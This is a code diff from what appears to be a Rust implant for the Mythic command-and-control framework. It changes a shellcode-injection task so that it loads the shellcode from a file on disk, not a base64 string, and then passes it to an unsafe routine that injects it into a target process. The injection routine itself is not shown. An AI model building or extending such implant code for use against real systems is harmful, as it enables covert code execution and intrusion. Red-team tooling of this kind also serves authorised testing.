@@ -40,16 +40,40 @@ pub fn inject_shellcode(task: &AgentTask) -> Result<serde_json::Value, Box<dyn s
     // Parse arguments from task parameters
     let args: ShinjectArgs = serde_json::from_str(&task.parameters)?;
 
-    // Decode shellcode from base64
-    let shellcode_bytes = match general_purpose::STANDARD.decode(&args.shellcode) {
-        Ok(bytes) => bytes,
-        Err(_) => {
-            return Ok(mythic_error!(
-                task.id,
-                "Shellcode must be base64 encoded or file download must be implemented"
-            ));
+    // The shellcode field contains the file ID from Mythic
+    // We need to download the file from Mythic first
+    // For now, we'll try to read the file from common locations
+    // In a real implementation, you would use Mythic's file download mechanism
+    
+    let mut shellcode_bytes = Vec::new();
+    
+    // Try to read the file from various possible locations
+    let possible_paths = vec![
+        std::path::Path::new(&args.shellcode),
+        std::env::temp_dir().join(&args.shellcode),
+        std::env::current_dir()?.join(&args.shellcode),
+    ];
+    
+    let mut found_file = false;
+    for path in possible_paths {
+        if path.exists() {
+            match std::fs::read(path) {
+                Ok(bytes) => {
+                    shellcode_bytes = bytes;
+                    found_file = true;
+                    break;
+                }
+                Err(_) => continue,
+            }
         }
-    };
+    }
+    
+    if !found_file {
+        return Ok(mythic_error!(
+            task.id,
+            format!("Shellcode file '{}' not found. Please ensure the file is uploaded to Mythic and downloaded to the agent first.", args.shellcode)
+        ));
+    }
 
     unsafe {
         match inject_shellcode_impl(args.process_id, &shellcode_bytes) {
